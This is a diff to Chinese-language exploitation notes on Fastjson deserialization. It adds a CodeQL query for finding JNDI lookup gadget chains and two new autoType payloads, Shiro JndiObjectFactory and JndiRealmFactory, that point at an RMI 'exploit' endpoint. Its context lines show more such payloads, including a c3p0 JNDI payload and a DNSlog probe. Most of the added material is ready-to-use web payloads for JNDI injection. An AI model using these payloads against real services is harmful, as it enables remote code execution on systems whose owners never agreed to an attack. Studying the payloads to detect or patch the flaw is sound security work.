@@ -41,6 +41,50 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 ```
 
 
+## 利用链挖掘
+https://xz.aliyun.com/t/7482   
+https://xz.aliyun.com/t/7789#toc-4   
+主要用codeql进行挖掘
+```java
+/**
+@kind path-problem
+*/
+
+import java
+import semmle.code.java.dataflow.FlowSources
+import semmle.code.java.dataflow.TaintTracking2
+import DataFlow2::PathGraph
+
+class JNDIMethod extends Method{
+    JNDIMethod(){
+        this.getDeclaringType().getAnAncestor().hasQualifiedName("javax.naming", "Context") and
+        this.hasName("lookup")
+    }
+}
+
+class MyTaintTrackingConfiguration extends TaintTracking2::Configuration {
+  MyTaintTrackingConfiguration() { this = "MyTaintTrackingConfiguration" }
+
+  override predicate isSource(DataFlow::Node source) {
+    exists(FieldAccess fac|
+    source.asExpr() = fac
+    )
+  }
+
+  override predicate isSink(DataFlow::Node sink) {
+    exists(MethodAccess call |
+    call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(0)
+    )
+  }
+}
+
+
+from  MyTaintTrackingConfiguration config, DataFlow2::PathNode source, DataFlow2::PathNode sink
+where config.hasFlowPath(source, sink)
+select source.getNode(), source, sink, sink.getNode()
+```
+
+
 
 ## 各版本利用
 
@@ -86,7 +130,18 @@ JdbcRowSetImpl无法成功可以一试
 {"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"rmi://127.0.0.1:1099/badClassName", "loginTimeout":0}
 ```
 
+#### shiro#JndiObjectFactory
 
+```java
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory", "resourceName":"rmi://127.0.0.1:9050/exploit"}
+```
+
+#### shiro#JndiRealmFactory
+
+```java
+{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":"rmi://127.0.0.1:9050/exploit"}
+
+```
 
 #### bcel
 
